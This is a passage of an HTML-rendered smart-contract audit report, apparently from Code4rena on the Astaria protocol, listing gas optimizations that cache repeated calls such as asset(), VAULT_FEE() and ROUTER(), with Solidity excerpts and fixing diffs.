class=\"grvsc-source\"><span class=\"mtk1\">             .mulWadDown(s.liquidationWithdrawRatio)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             .safeCastTo88();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -330,7 +330,7 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _setYIntercept(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         s,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         s.yIntercept -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _totalAssets.mulDivDown(s.liquidationWithdrawRatio, 1e18)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       // burn the tokens of the LPs withdrawing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _burn(address(this), proxySupply);</span></span></span></code></pre>\n<h3 id=\"publicvaultsoltransferwithdrawreserve-result-of-asset-should-be-cached\" style=\"position:relative;\"><a href=\"#publicvaultsoltransferwithdrawreserve-result-of-asset-should-be-cached\" aria-label=\"publicvaultsoltransferwithdrawreserve result of asset should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PublicVault.sol.transferWithdrawReserve(): Result of asset() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359-L411\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359-L411</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"218\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">359</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferWithdrawReserve</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit: Initial call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: second call</span></span></span></code></pre>\n<h3 id=\"publicvaultsol_handlestrategistinterestreward-vault_fee-should-be-cached\" style=\"position:relative;\"><a href=\"#publicvaultsol_handlestrategistinterestreward-vault_fee-should-be-cached\" aria-label=\"publicvaultsol_handlestrategistinterestreward vault_fee should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PublicVault.sol._handleStrategistInterestReward(): VAULT_FEE() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L597-L609\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L597-L609</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"219\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">602</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">VAULT_FEE</span><span class=\"mtk1\">() != </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">603</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">x</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">interestOwing</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">interestOwing</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">604</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">x</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT_FEE</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"220\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PublicVault.sol b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 16247ce..c5ceb07 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -599,9 +599,10 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 interestOwing,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) internal virtual {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (VAULT_FEE() != uint256(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 _vault_fee = VAULT_FEE();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (_vault_fee != uint256(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 x = (amount &gt; interestOwing) ? interestOwing : amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      uint256 fee = x.mulDivDown(VAULT_FEE(), 10000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      uint256 fee = x.mulDivDown(_vault_fee, 10000);</span></span></span></code></pre>\n<h3 id=\"vaultimplementationsolbuyoutlien-router-should-be-cached\" style=\"position:relative;\"><a href=\"#vaultimplementationsolbuyoutlien-router-should-be-cached\" aria-label=\"vaultimplementationsolbuyoutlien router should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>VaultImplementation.sol.buyoutLien(): ROUTER() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"221\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">322</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">LienToken</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">LIEN_TOKEN</span><span class=\"mtk1\">())); </span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">334</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">TRANSFER_PROXY</span><span class=\"mtk1\">()), </span><span class=\"mtk12\">buyout</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">343</span><span class=\"mtk1\">:            lien: </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">validateCommitment</span><span class=\"mtk1\">({ </span><span class=\"mtk3\">//@audit: 3rd access</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"222\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5ff5d7..659db03 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -319,7 +319,8 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     whenNotPaused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     returns (ILienToken.Stack[] memory, ILienToken.Stack memory)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IAstariaRouter _ROUTER = ROUTER();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    LienToken lienToken = LienToken(address(_ROUTER.LIEN_TOKEN()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     (uint256 owed, uint256 buyout) = lienToken.getBuyout(stack[position]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -331,7 +332,7 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validateCommitment(incomingTerms, recipient());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ERC20(asset()).safeApprove(address(_ROUTER.TRANSFER_PROXY()), buyout);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       lienToken.buyoutLien(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -340,7 +341,7 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           encumber: ILienToken.LienActionEncumber({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             amount: owed,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             receiver: recipient(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            lien: ROUTER().validateCommitment({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            lien: _ROUTER.validateCommitment({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">               commitment: incomingTerms,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">               timeToSecondEpochEnd: _timeToSecondEndIfPublic()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }),</span></span></span></code></pre>\n<h3 id=\"vaultimplementationsolbuyoutlien-asset-should-be-cached\" style=\"position:relative;\"><a href=\"#vaultimplementationsolbuyoutlien-asset-should-be-cached\" aria-label=\"vaultimplementationsolbuyoutlien asset should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>VaultImplementation.sol.buyoutLien(): asset() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L326-L334\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L326-L334</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"223\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">326</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">buyout</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">))) { </span><span class=\"mtk3\">//@audit: asset() Initial call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">334</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">TRANSFER_PROXY</span><span class=\"mtk1\">()), </span><span class=\"mtk12\">buyout</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: asset() 2nd call</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"224\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5ff5d7..e003f4e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -322,8 +322,8 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     (uint256 owed, uint256 buyout) = lienToken.getBuyout(stack[position]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (buyout &gt; ERC20(asset()).balanceOf(address(this))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ERC20 _asset = ERC20(asset());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (buyout &gt; _asset.balanceOf(address(this))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       revert IVaultImplementation.InvalidRequest(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         InvalidRequestReason.INSUFFICIENT_FUNDS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -331,7 +331,7 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _validateCommitment(incomingTerms, recipient());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _asset.safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       lienToken.buyoutLien(</span></span></span></code></pre>\n<h3 id=\"vaultimplementationsol_handleprotocolfee-router-should-be-cached-happy-path\" style=\"position:relative;\"><a href=\"#vaultimplementationsol_handleprotocolfee-router-should-be-cached-happy-path\" aria-label=\"vaultimplementationsol_handleprotocolfee router should be cached happy path permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>VaultImplementation.sol._handleProtocolFee(): ROUTER() should be cached (happy path)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L397-L409\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L397-L409</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"225\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">398</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">feeTo</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">399</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeOn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">feeOn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">getProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"226\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5ff5d7..41ea5ee 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -395,10 +395,11 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function 